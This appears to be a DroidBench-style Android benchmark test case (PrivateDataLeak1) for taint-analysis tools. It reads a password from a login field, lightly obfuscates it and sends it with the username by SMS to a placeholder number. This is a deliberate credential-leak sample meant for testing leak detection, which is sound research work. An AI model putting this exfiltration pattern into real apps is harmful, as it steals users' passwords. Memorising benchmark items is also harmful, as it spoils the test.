package de.ecspride;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import de.ecspride.data.User;

/**
 * @testcase_name PrivateDataLeak1
 * @version 0.2
 * @author Secure Software Engineering Group (SSE), European Center for Security
 and Privacy by Design (EC SPRIDE) 
 * @author_mail siegfried.rasthofer@cased.de
 * 
 * @description A value from a password field is obfuscated and sent via sms.
 * @dataflow source -> pwd -> user.pwd.password -> password ->
 obfuscatedUsername -> message -> sink
 * @number_of_leaks 1
 * @challenges the analysis has to treat the value of password fields as source,
 *  handle callbacks defined in the layout xml and support taint tracking in
 *  String/char transformations
 */
public class PrivateDateLeakage extends Activity {
    private User user = null;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_private_date_leakage);
    }
    
    @Override
    protected void onRestart() {
        super.onRestart();
        EditText usernameText = (EditText) findViewById(R.id.username);
        EditText passwordText = (EditText) findViewById(R.id.password);
        String uname = usernameText.toString();
        String pwd = passwordText.getText().toString();
        user = new User(uname, pwd);
    }
    
    public void sendMessage(View view) {
        if (user != null) {
            String password = getPassword();
            String obfuscatedUsername = "";
            for (char c : password.toCharArray()) obfuscatedUsername += c + "_";
            String message = "User: " + user.getUsername() + " | Pwd: " +
            obfuscatedUsername;
            SmsManager smsmanager = SmsManager.getDefault();
            Log.i("TEST", "sendSMS");
            smsmanager.sendTextMessage("+49 1234", null, message, null, null);
        }
    }
    
    private String getPassword() {
        if (user != null)
            return user.getPwd().getPassword();
        else {
            Log.e("ERROR", "no password set");
            return null;
        }
    }
    
    public PrivateDateLeakage() { super(); }
    
    public static final String jlc$CompilerVersion$jl7 = "2.7.1";
    public static final long jlc$SourceLastModified$jl7 = 1450032968000L;
    public static final String jlc$ClassType$jl7 =
      ("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");
}
